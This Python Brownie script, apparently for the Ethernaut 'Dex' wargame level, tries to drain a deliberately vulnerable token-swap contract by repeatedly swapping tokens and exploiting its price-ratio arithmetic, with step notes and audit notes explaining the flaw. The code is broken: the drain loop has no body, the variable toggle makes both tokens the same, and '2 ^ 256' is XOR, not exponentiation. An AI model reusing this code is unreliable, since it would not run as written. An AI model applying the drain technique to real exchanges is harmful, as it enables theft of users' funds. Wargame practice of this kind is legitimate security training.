from scripts.helpful_scripts import get_account
from brownie import web3, interface, convert, Attack22
from eth_utils import keccak


ETHERNAUT_INSTANCE = "0x54B33296970E87bde1504FB91E441008aB69347c"
TOKEN1 = "0x0cDbf0cb813020505f2C2C57187a3CB1249C34ad"
TOKEN2 = "0x3dE9BcAA4027ca200c22b159f70b683714Cd45F0"
AMOUNT = 10

GAS_LIMIT = 6000000


def balances(_target):
    balance1 = _target.balanceOf(TOKEN1, ETHERNAUT_INSTANCE)
    balance2 = _target.balanceOf(TOKEN2, ETHERNAUT_INSTANCE)
    print(f"\nbalance 1 = {balance1}, balance 2 = {balance2}\n")


def main():
    # steps 1 and 2
    player = get_account()
    target = interface.IDex(ETHERNAUT_INSTANCE)
    balances(target)
    # step 3
    token1 = interface.IERC20(target.token1())
    token2 = interface.IERC20(target.token2())
    # step 4
    token1.approve(target, 2 ^ 256, {"from": player})
    token2.approve(target, 2 ^ 256, {"from": player})
    # step 5a
    tokenTo = token1
    tokenFrom = token2
    # step 5b
    tokenTo = tokenFrom
    tokenFrom = tokenTo
    # step 6
    price = target.getSwapPrice(tokenFrom, tokenTo, tokenFrom.balanceOf(player))
    # step 7
    while price <= tokenTo.balanceOf(target):
        

"""
        Script steps:
        
        1) set player account
        2) define target interface (Dex contract)
        3) define token1 and token2
        4) approve token1 and token2
        
        5) assign tokenTo and tokenFrom (so you can toggle them)
            5a. assign tokenTo / tokenFrom
            5b. toggle to/from
        
        6) get swap_price

        7) while swap_price < tokenTo.balanceOf(target)
            8a. perform swap
            8b. toggle to/from
            8c. get swap_price

        8) manually perform the final swap to drain the funds
                        
    ===================================================================

    Audit notes:

        1. Dex contract
            - storage slot 0, 1, 2 -> contain addresses
        2. SwappableToken contract
            - we can ignore this as the approve method is included
              in the Dex contract (for ease)
        3. Function swap() is where the token transfer happens
       
        4. Swap price calculation
        
            - (amount * 'to' price) / ('from' price)
                so: swap price == amount * (token ratio)
    
        5. Swap process ->

            - see 22-simulate_dex.py (this models the swap process)
        

"""
